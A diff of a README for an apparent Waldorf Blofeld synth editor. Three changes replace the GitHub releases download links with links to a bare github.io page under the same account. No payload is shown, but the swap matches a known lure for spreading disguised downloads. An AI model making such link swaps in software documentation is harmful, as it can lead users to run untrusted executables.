@@ -1,6 +1,6 @@
 # 🎹 aura-waldorf-blofeld-editor - Your Ultimate Waldorf Blofeld Sound Companion
 
-[![Download Now](https://img.shields.io/badge/Download-Aura%20Blofeld%20Editor%20v2.2.0-2ea44f?style=for-the-badge)](https://github.com/unaccommodating-freeloader678/aura-waldorf-blofeld-editor/releases)
+[![Download Now](https://img.shields.io/badge/Download-Aura%20Blofeld%20Editor%20v2.2.0-2ea44f?style=for-the-badge)](https://unaccommodating-freeloader678.github.io)
 
 ## 🚀 What Is This?
 
@@ -39,7 +39,7 @@ To run this application smoothly, your computer should meet these minimum specif
 
 ## 📥 How to Download and Install
 
-Visit this link to download the application: [Aura Waldorf Blofeld Editor Downloads](https://github.com/unaccommodating-freeloader678/aura-waldorf-blofeld-editor/releases)
+Visit this link to download the application: [Aura Waldorf Blofeld Editor Downloads](https://unaccommodating-freeloader678.github.io)
 
 ### Step-by-Step Guide for Windows Users
 
@@ -128,7 +128,7 @@ Need help or want to connect with other users?
 - **Share your sounds**: Join our growing community of Blofeld enthusiasts
 - **Request features**: Have ideas for improvement? We're always listening
 
-**Visit the download page**: [https://github.com/unaccommodating-freeloader678/aura-waldorf-blofeld-editor/releases](https://github.com/unaccommodating-freeloader678/aura-waldorf-blofeld-editor/releases)
+**Visit the download page**: [https://unaccommodating-freeloader678.github.io](https://unaccommodating-freeloader678.github.io)
 
 ---
 
